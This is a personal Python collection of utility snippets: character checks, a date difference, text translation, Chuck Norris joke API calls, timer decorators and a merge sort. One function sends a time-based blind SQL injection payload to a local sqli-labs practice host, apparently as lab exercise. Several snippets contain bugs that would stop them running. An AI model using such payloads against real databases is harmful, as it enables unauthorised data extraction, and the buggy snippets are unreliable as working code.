# is_alphanum
# is_alpha
# prompt_int_in_range
# diff_between_dates
# Translate text from file
# random_chuck_norris
# get_job_by_category
# Measure time for requests completion
# Timer function / Decorator
# Decorator pattern
# sort-merge function

def is_alphanum(str):
    ''' Equivalent to built-in isalnum()
    codes 48 to 57: numeric (0-9) / 65 to 90: upper alpha (A-Z) / 97 to 122: lower alpha (a-z)
    '''
    for char in str:
        code = ord(char)
        if not (47 < code < 58 or 64 < code < 91 or 96 < code < 123):
            return False
    return True

def is_alpha(str):
    ''' Equivalent to built-in isalpha()
    codes 65 to 90: upper alpha (A-Z) / 97 to 122: lower alpha (a-z)
    '''
    for char in str:
        code = ord(char)
        if not(64 < code < 91 or 96 < code < 123):
            return False
    return True

def prompt_int_in_range(inf, sup):
    ''' Asks for and returns an integer within a range 
    '''
    number = None
    while type(number) is not int:
        try:
            return int(input(“Please enter a number between {} and {} : “.format(inf, sup)))
        except ValueError:
            print(“%s is not an integer.\n” % number)

# TIME
import datetime
def diff_between_dates():
    present = datetime.datetime.now()
    future = datetime.datetime(2022,1,1,0,0,0)
    diff = future - present
    days, hours, minutes = diff.days, diff.seconds // 3600, diff.seconds // 60 % 60
    print(f"The delta between present and future is {days} days, {hours} hours and {minutes} minutes.\n")

# Translate text from file
from translate import Translator

def translate_from_file(file, from, to='ja'):
    translator = Translator(to_lang = to)
    try:
        with open('./test.txt', mode='r') as my_file:
            text = my_file.read()
            translation = translator.translate(text)
            with open('./test-ja.txt', mode='w') as my_out_file:
                my_out_file.write(translation)
    except FileNotFoundError as e:
        print('Check file path')

# API get Chuck Norris jokes
import requests

def random_chuck_norris():
    response = requests.get("https://api.chucknorris.io/jokes/random")

    data = response.json()

    def esc(code):
        return f'\033[{code}m'

    print(f"\nChuck Norris random joke:\n", esc('31;1'), data['value'], esc(0), "\n")

def get_categories(request_url='https://api.chucknorris.io/jokes/categories'):
    response = requests.get(request_url)
    print('getting categories...')
    if response.status_code == 200:
        return response.json()
    else:
        print('bad request or server failure')

def get_joke_by_category():
    categories = get_categories()
    user_choice = input('pick a category:\n' + '\n'.join(categories))
    while user_choice not in categories:
        print('bad choice try again')
        user_choice = input('pick a category' + categories)
    url = f'https://api.chucknorris.io/jokes/random?category={user_choice}'
    response = requests.get(url)
    if response.status_code == 200:
        print(response.json()['value'])

# import requests
import time

def measure_req_completion_time():
    payload = {"id": "1' and if (ascii(substr(database(), 1, 1))=115,sleep(3),null) --+"}
    start = time.time()
    r = requests.get('http://192.168.2.15/sqli-labs/Less-9', params=payload)
    roundtrip = time.time() - start
    print(round(roundtrip, 2), 's')

# Timer function to be used as a decorator
from time import perf_counter

def timer(func):
    def wrapper(*args, **kwargs):
        start = perf_counter()
        payload = func(*args, **kwargs)
        end = perf_counter()
        print(colored(f"Elapsed time for {func.__name__}: {end - start: 0.6f} seconds", 'red'))
        return payload
    return wrapper

@timer
def function_to_measure(arg1, arg2):
    # <Your code here>
    pass

# Decorator pattern
def my_decorator(func):
    def wrapper(*args, **kwargs):
        print('****')
        func(*args, **kwargs)
        print('****')
    return wrapper

@my_decorator
def greeting(text, emoji=':('):
    print(text, emoji)

greeting('Hello Toto')

# Sort merge function (sorts an array)
def merge_sort(arr):
    if len(arr) == 1:
        return arr
    else:
        a = arr[:len(arr)//2]
        b = arr[len(arr)//2:]
        
        a = merge_sort(a)
        b = merge_sort(b)
        c = []
        
        i = 0
        j = 0
        while i < len(a) and j < len(b):
            if a[i] < b[j]:
                c.append(a[i])
                i = i + 1
            else:
                c.append(b[j])
                j = j + 1
        c += a[i:]
        c += b[j:]
        return c